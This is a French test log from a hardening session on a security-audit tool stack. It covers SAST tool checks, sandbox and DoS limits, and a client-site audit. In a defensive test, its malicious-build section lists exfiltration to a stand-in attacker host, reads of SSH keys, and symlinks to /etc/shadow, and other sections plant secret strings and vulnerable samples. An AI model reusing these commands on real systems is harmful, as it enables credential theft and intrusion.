# Liste exhaustive des tests effectués sur la stack pentest

Date : 2026-05-05 — session unique de hardening complet.
Format : numéro · cible · résultat · phase.

---

## A. Health-check initial environnement (avant code)

| # | Test | Résultat |
|---|---|---|
| 1 | Versions des 24 outils Kali (nmap, semgrep, bandit, gosec, eslint, etc.) | ✅ tous présents |
| 2 | Wrappers maison existants (`audit-fingerprint`, `client-audit-{code,web,net}`, `client-{mount,umount}`, `mine-{yield,resume}`) | ✅ 8/8 présents |
| 3 | `nmap` localhost top-1000 | ✅ ports 22, 3000, 8081 |
| 4 | `bandit` sur fichier Python piégé (eval, pickle.loads, subprocess shell=True) | ✅ 5 issues détectées |
| 5 | `audit-fingerprint 127.0.0.1` (pré-patch) | 🐛 regex flagait "IP PUBLIQUE" |
| 6 | `audit-fingerprint 192.168.1.142` | ✅ "IP privée LAN" |
| 7 | `audit-fingerprint 8.8.8.8` | ✅ "IP PUBLIQUE — ordre mission" |
| 8 | `client-mount` (sshfs sky-master 1TB) | ✅ déjà monté |
| 9 | Mining xmrig actif (PID, hashrate) | ✅ 900 H/s |
| 10 | Canal `~/linux-upgrade/MESSAGE_TO_LUDO_PC1.md` | ✅ accessible |

---

## B. Audit cole-de-danse (premier client réel)

| # | Test | Résultat |
|---|---|---|
| 11 | Recherche repo `sky1241/-cole-de-danse` via API GitHub | ✅ trouvé |
| 12 | `git clone` du repo (44 fichiers, 7.1 Mo) | ✅ |
| 13 | `audit-fingerprint` sur le dossier | ✅ HTML5 + XML détectés |
| 14 | `cat README.md` + `cat CNAME` (= `haoyanwuying.com`) | ✅ |
| 15 | `grep` secrets dans `index.html` | ✅ aucun secret réel (placeholder Baidu commenté) |
| 16 | Serveur HTTP local sur :8090 (`python3 -m http.server`) | ✅ |
| 17 | `whatweb -a 3 http://127.0.0.1:8090/` | ✅ BaseHTTP/Python 3.13.12 |
| 18 | `nikto` sur :8090 (60s) | ✅ 7 findings (headers manquants) |
| 19 | `gobuster dir` avec common.txt | ✅ `/index.html` trouvé |
| 20 | `curl -I https://haoyanwuying.com/` (passif prod) | ✅ headers GitHub Pages |
| 21 | `curl https://haoyanwuying.com/.git/HEAD` | ✅ 404 (prod safe) |
| 22 | `curl https://haoyanwuying.com/.git/config` | ✅ 404 |
| 23 | Extraction 449 lignes JS inline via Python regex | ✅ aucun pattern dangereux |
| 24 | `client-audit-code` sur cole-de-danse v1 (rapport vide bug) | 🐛 outputs vides dans .out |

---

## C. Patches initiaux

| # | Patch | Test |
|---|---|---|
| 25 | `audit-fingerprint` : regex IP étendue 127/8 + 169.254/16 | ✅ 3 cas regression |
| 26 | `client-audit-code` v2 : retrait `--quiet --error` semgrep | ✅ 23 lignes output |
| 27 | `client-audit-code` v3 : détection JS inline HTML + extraction Python | ✅ 449 lignes JS analysées |
| 28 | `client-audit-code` v4 : eslint v10 flat config + parser TS via require absolu | ✅ JS + TS détectés |
| 29 | `client-audit-code` v5 : `HAS_BIN` exclut `.git/*` + images sshfs | ✅ clamav skippé sur cole-de-danse |
| 30 | `shellcheck` `--severity` `warning` → `info` (SC2086 = critique sécu) | ✅ 3 issues détectées |
| 31 | Re-test cole-de-danse final post-patches | ✅ tous outils OK |

---

## D. Multi-langage SAST (24 → 23 outils intégrés)

| # | Outil | Test rosetta-stone |
|---|---|---|
| 32 | bandit (Python) — eval + pickle.loads + os.system | ✅ B307 + B403 + B602 détectés |
| 33 | gosec (Go) — md5.New() | ✅ G401 weak crypto |
| 34 | eslint (JS) — eval + new Function | ✅ no-eval + no-new-func |
| 35 | eslint + parser TS — bad.ts avec eval | ✅ 4 errors total .js+.ts |
| 36 | eslint-inline (HTML inline) — extraction `<script>` | ✅ 2 blocks JS, 1 JSON-LD ignoré |
| 37 | phpstan — `$undefinedVariable` | ✅ 19 lignes erreurs |
| 38 | brakeman (Ruby/Rails) — eval + system | ✅ 12 Security Warnings |
| 39 | bundler-audit (Gemfile.lock Rails 4.0.0) | ✅ multiples CVE |
| 40 | cargo-audit (Cargo.lock time 0.1.43) | ✅ RUSTSEC-2020-0071 |
| 41 | cppcheck (C) — gets() | ✅ obsolete + getsCalled |
| 42 | flawfinder (C) — strcpy + gets | ✅ CWE-120 buffer overflow |
| 43 | shellcheck (Bash) — `$1` non quoté | ✅ SC2086 ×3 |
| 44 | yamllint — indent error | ✅ syntax error |
| 45 | semgrep multi-langage `p/security-audit` + `p/secrets` | ✅ Findings: 8 |
| 46 | trufflehog3 (secrets `--severity HIGH`) | ✅ marche (sortie vide normale en HIGH) |
| 47 | clamav EICAR test file (68 octets) | ✅ Eicar-Test-Signature FOUND |
| 48 | trivy-deps (lockfiles) | ✅ Cargo/Gemfile/npm/pip CVE détectés |
| 49 | trivy-config (Dockerfile + K8s) | ✅ FAILURES: 14, USER root, privileged |

---

## E. Outils complémentaires (gitleaks / retire / pip-audit)

| # | Test | Résultat |
|---|---|---|
| 50 | `gitleaks dir` sur AKIA*EXAMPLE (whitelisté) | 🐛 0 leak (whitelist) |
| 51 | `gitleaks dir` avec AKIAQ27Y4PNJ4PYG2XYZ + ghp_36chars | ✅ 3 leaks détectés (REDACTED) |
| 52 | `retire --path` sur jquery-1.6.1.min.js | ✅ 9+ CVE jQuery |
| 53 | `pip-audit` sur requests==2.6.0 | ✅ 19 vulnérabilités (PYSEC + CVE) |

---

## F. Mode delta (`client-audit-diff`)

| # | Test | Résultat |
|---|---|---|
| 54 | Repo audit 1 : eval + new Function | ✅ 2 findings eslint |
| 55 | Repo audit 2 : eval supprimé, new Function reste | ✅ 1 finding eslint |
| 56 | `client-audit-diff` entre les 2 | ✅ 4 fixés / 3 nouveaux / 0 inchangé |
| 57 | Diff sur fichier vide trufflehog3 (awk anti-crash) | ✅ pas de SIGPIPE |

---

## G. CI rosetta-stone (`client-audit-test`)

| # | Test | Résultat |
|---|---|---|
| 58 | v1 14 CHECKS — patterns trop laxes | 🐛 14/14 PASS faux positifs |
| 59 | Audit propre patterns (agent review) | 🐛 4 patterns laxes confirmés |
| 60 | v2 patterns stricts (`Findings: [1-9]`, `Total: [1-9]`, etc.) | ✅ |
| 61 | Test négatif : `Findings: 0` → REJECT correct | ✅ |
| 62 | Test négatif : `Total: 0 (UNKNOWN: 0...)` → REJECT correct | ✅ |
| 63 | Test négatif : `osv-scanner 0 vulns` → REJECT correct | ✅ |
| 64 | Test positif : 23 outils détectent leur vuln signature | ✅ 23 PASS |

---

## H. Audit pro v1 — bugs trouvés (post-Chunk1)

| # | Bug | Fix |
|---|---|---|
| 65 | `dockle path positionnel → "invalid image"` | `--input <file>` |
| 66 | `bash -c "$cmd"` SIGPIPE masqué | `bash -c "set -o pipefail; $cmd"` |
| 67 | `wait || true` masque crashs workers | loop `wait` par PID |
| 68 | `$$` dans nom temp = collision PID wrap | `mktemp -d` |
| 69 | semgrep/trivy-deps/trivy-config/osv-scanner patterns laxes | patterns stricts (compteurs non-zéro) |

---

## I. Hardening 10 chunks senior eng

### Chunk 1 — Bash hardening
| # | Test |
|---|---|
| 70 | `pipefail` interne dans `bash -c` |
| 71 | `wait` propagation par PID |
| 72 | `mktemp` au lieu de `$$` |
| 73 | `dockle --input` au lieu de path positionnel |
| 74 | `cppcheck/flawfinder/yamllint --` séparateur |
| 75 | Re-run rosetta : 23/23 PASS |

### Chunk 2 — DoS limits
| # | Test |
|---|---|
| 76 | Symlink `/etc/passwd` → exclu par `rsync --safe-links` |
| 77 | Symlink `/home/sky/.ssh` → exclu |
| 78 | 60k fichiers (path bomb) → exit 2 (`AUDIT_MAX_FILES=50000`) |
| 79 | Repo > 1 GiB → exit 2 (`AUDIT_MAX_TOTAL_SIZE_MB=1024`) |
| 80 | `find -maxdepth 30` partout |
| 81 | Re-run rosetta non-régression |

### Chunk 3 — Sandbox firejail
| # | Test |
|---|---|
| 82 | Install firejail (apt) |
| 83 | Profil bloque `/home/sky/.ssh` |
| 84 | Profil bloque `/home/sky/Bureau/Audit-Securite-Clients` |
| 85 | `--net=none` bloque curl |
| 86 | bandit / semgrep tournent dans sandbox |
| 87 | Rosetta sandbox v1 → 1 FAIL OOM semgrep (rlimit-as 4G) |
| 88 | Fix rlimit-as 4G→8G |
| 89 | Rosetta sandbox v2 → 23/23 PASS |
| 90 | Test isolation : `cat ~/.ssh/id_rsa` dans sandbox → "Permission non accordée" |

### Chunk 4 — Mode offline
| # | Test |
|---|---|
| 91 | `AUDIT_OFFLINE=1` brut → 4 FAIL outils online |
| 92 | `run_tool_online` ajouté (semgrep, retire, bundler-audit, osv-scanner) |
| 93 | Re-test offline → 19 PASS / 4 WARN propres |

### Chunk 5 — JSON output
| # | Test |
|---|---|
| 94 | `--format=all` génère .md + .json |
| 95 | Schéma JSON `claude-audit-code/v1` validé via `python -c json.load` |
| 96 | `--format=json` seul (pas de .md) |

### Chunk 6 — Version pinning + cache
| # | Test |
|---|---|
| 97 | `tool-versions.lock` initial — 24 outils |
| 98 | `audit-doctor` : 24 OK / 0 DRIFT / 0 MISSING |
| 99 | Tampering détection : sed sur audit-doctor → "TAMPERED" |
| 100 | Restore + re-bump checksums → "OK" |
| 101 | Setup caches `~/.cache/audit-stack/{trivy,grype,osv-scanner}/` |
| 102 | Speedup cache : 102s 1er run → 21s suivant |

### Chunk 7 — audit-history
| # | Test |
|---|---|
| 103 | 2 audits (online + offline) → 2 entrées dans `.audit-history.jsonl` |
| 104 | `audit-history --limit=2` |
| 105 | `audit-history --filter=client-X` |
| 106 | Audit-history avec ligne JSONL corrompue → "(parse error)" + continue |

### Chunk 8 — --dry-run
| # | Test |
|---|---|
| 107 | `--dry-run` montre les 25 commandes outils (avec args expandés) |
| 108 | `--dry-run --json` génère JSON avec status DRY-RUN |
| 109 | `--dry-run` n'exécute aucun outil |

### Chunk 9 — Zipbomb detection
| # | Test |
|---|---|
| 110 | Création zipbomb : 10 MB de zeros → 10 ko zip (ratio 1016x) |
| 111 | Default mode → warning ratio 1016x > seuil 100x |
| 112 | `AUDIT_REJECT_ZIPBOMB=1` → exit 2 propre |

### Chunk 10 — Doc + tag
| # | Test |
|---|---|
| 113 | README v2 (threat model 11 vecteurs) |
| 114 | CHANGELOG.md |
| 115 | Tag v2.0.0 |
| 116 | Validation 3 modes : default 23/0/0, sandbox 23/0/0, offline 19/0/4 |

---

## J. Audit honnête post-v2 (Sky a redemandé "tu es sûr ?")

| # | Bug trouvé | Fix |
|---|---|---|
| 117 | `AUDIT_PARALLEL=0` → CRASH `TOOL_PIDS: variable sans liaison` | `TOOL_PIDS=()` explicite (`declare -a` ne suffit pas) |
| 118 | `grep: Fin d'intervalle invalide` à chaque run | retiré DURATION_S inutile |
| 119 | `gitleaks=process` dans tool-versions.lock | extraction via `dpkg` |
| 120 | Faux bug : sandbox+offline 1 FAIL transitoire | re-test = OK |
| 121 | Faux bug : `--dry-run --json` ne génère JSON | grep filtrait trop |

Tag `v2.0.1` après ces fixes.

---

## K. Tests edge cases agressifs (post-v2.0.1)

| # | Test | Résultat |
|---|---|---|
| 122 | Nom fichier avec espace + apostrophe (`O'Brien with space.py`) | ✅ |
| 123 | Nom client avec apostrophe (`O'Test`) | ✅ |
| 124 | Path relatif (`.`) | ✅ |
| 125 | Symlink loop self/parent (`ln -s . loop_self`) | ✅ |
| 126 | 2 audits parallèles sur même target (mêmes secondes) | 🐛 collision LOG_DIR |
| 127 | Fix DATE_TAG : ajout `$$` PID | ✅ 2 LOG_DIR distincts |
| 128 | `AUDIT_TOOL_TIMEOUT=1` → semgrep TIMEOUT | ✅ TIMEOUT tracké en manifest |
| 129 | `AUDIT_TOOL_TIMEOUT=0` → pas de timeout (comportement GNU) | ✅ |
| 130 | `AUDIT_TOOL_TIMEOUT=-5` (négatif) | ✅ no crash, comportement timeout natif |
| 131 | `AUDIT_MAX_FILES=1` → refus | ✅ exit 2 |
| 132 | `AUDIT_MAX_FILES=0` → refus | ✅ exit 2 |
| 133 | URL invalide `this-domain-doesnt-exist-zzz9876.invalid` | ✅ "(échec curl)" exit 0 |
| 134 | `audit-fingerprint fe80::1` (IPv6 link-local) — pré-fix | 🐛 "cible inconnue" |
| 135 | `audit-fingerprint ::1` (IPv6 loopback) — pré-fix | 🐛 "cible inconnue" |
| 136 | Fix audit-fingerprint : pattern IPv6 + `-6` flag | ✅ ::1 et fe80:: marchent |
| 137 | Path avec accents `/tmp/édge-té/fiché.py` | ✅ |
| 138 | Path unicode + espaces `/tmp/test 中文 audit/` | ✅ |
| 139 | `audit-doctor` avec wrapper supprimé (`mv audit-history /tmp`) | ✅ MISSING détecté |
| 140 | `audit-doctor` avec wrapper non-exécutable (`chmod -x`) | ✅ TAMPERED |
| 141 | Test 14 : `audit-claude-*.md` du run précédent dans nouveau snapshot | 🐛 "fichiers analysés : 2" |
| 142 | Fix : rsync `--exclude='audit-claude-*.md' --exclude='audit-claude-*.json'` | ✅ "1 fichier" |
| 143 | `audit-fingerprint` chemin inexistant | ✅ "cible inconnue" |
| 144 | Repo avec uniquement `.git/` | ✅ 18 fichiers (hooks samples) analysés |
| 145 | Symlink vers `/home/sky` direct (max danger) | ✅ exclu |
| 146 | `client-audit-diff` sur dirs vides | ✅ exit 1 propre |
| 147 | `audit-history --filter` regex bizarre | ✅ tableau vide |
| 148 | `client-audit-test --keep` | ✅ rosetta + logs gardés |
| 149 | Dossier vide + `--json` | ✅ JSON valide total_files=0 |
| 150 | `audit-fingerprint 8.8.8.8` (publique = warn) | ✅ |
| 151 | Fichier 200 MB (> AUDIT_MAX_FILE_SIZE=50M) | ✅ exclu par rsync |
| 152 | `AUDIT_PARALLEL=yes` (invalide) | ✅ fallback serial |
| 153 | `AUDIT_PARALLEL=2` (invalide) | ✅ fallback serial |
| 154 | `install.sh` 3 fois consécutives (idempotence) | ✅ 0 backup orphelin |
| 155 | `audit-fingerprint` sur dir avec FIFO | ✅ no crash |
| 156 | Bug `pip-audit` non marqué online → FAIL en `AUDIT_OFFLINE=1` | 🐛 |
| 157 | Fix : `run_tool_online` pour pip-audit | ✅ 18/0/5 propre |

---

## L. Test attaque réelle (build.rs malveillant)

| # | Vecteur | Sans sandbox | Avec sandbox+offline |
|---|---|---|---|
| 158 | `Cargo.toml` + `build.rs` qui essaie `cat ~/.ssh/id_rsa` | ✅ 0 PWNED | ✅ 0 PWNED |
| 159 | `build.rs` → `curl http://attacker.example.com/leak` | ✅ 0 PWNED | ✅ 0 PWNED |
| 160 | `build.rs` → `touch /tmp/PWNED-rce.txt` | ✅ 0 PWNED | ✅ 0 PWNED |
| 161 | `Gemfile` avec `load File.expand_path("/etc/passwd")` | ✅ 0 PWNED | ✅ 0 PWNED |
| 162 | `setup.py` avec `os.system("touch /tmp/PWNED-setup.txt")` | ✅ 0 PWNED | ✅ 0 PWNED |
| 163 | Symlink `/etc/shadow` | ✅ EXCLU | ✅ EXCLU |
| 164 | Symlink `/home/sky/.ssh` | ✅ EXCLU | ✅ EXCLU |

**Résultat global** : la stack résiste sans sandbox grâce à `rsync --safe-links` + cargo/pip/bundler-audit qui ne lancent pas de build.

---

## M. Validations finales 5 modes (post-v2.0.2)

| # | Mode | Résultat | Durée |
|---|---|---|---|
| 165 | default | 23 PASS / 0 FAIL / 0 WARN | 21s |
| 166 | `AUDIT_PARALLEL=0` (serial) | 23 PASS / 0 FAIL / 0 WARN | 39s |
| 167 | `AUDIT_SANDBOX=1` | 23 PASS / 0 FAIL / 0 WARN | 20s |
| 168 | `AUDIT_OFFLINE=1` | 18 PASS / 0 FAIL / 5 WARN | 19s |
| 169 | combo `PARALLEL=0+SANDBOX=1+OFFLINE=1` | 18 PASS / 0 FAIL / 5 WARN | 30s |

---

## N. Audit forge.py

| # | Test | Résultat |
|---|---|---|
| 170 | `wc -l forge.py` | 2730 lignes (109 ko) |
| 171 | `python -c ast.parse` syntaxe | ✅ |
| 172 | `bandit forge.py` HIGH | 2 (faux positifs : MD5 file-change + os.system literal) |
| 173 | `bandit forge.py` LOW | 29 (subprocess warnings standard) |
| 174 | `semgrep p/security-audit` | 0 finding |
| 175 | `grep eval/exec` | 0 |
| 176 | TODOs/FIXMEs | 1 |
| 177 | Fonctions définies | 49 (21 privées) |
| 178 | Classes | 0 (style fonctionnel) |
| 179 | Subprocess calls | 28 |
| 180 | Algorithmes implémentés stdlib only | Kalman, Wavelet, Kaplan-Meier, DTW, Louvain, Ochiai SBFL |

---

## Synthèse globale

- **180 tests numérotés** ci-dessus
- **15+ bugs réels identifiés et fixés** au fur et à mesure
- **23 outils SAST validés** sur rosetta-stone reproductible
- **5 modes opérationnels validés** bout-en-bout
- **0 PWN** sur attaque code malveillant (build.rs / setup.py / symlinks)
- **3 tags** : `pre-chunk1`, `v2.0.1`, `v2.0.2`
- **17 commits** sur le repo `claude-tooling`

Tag stable courant : **v2.0.2** sur `30243643`.
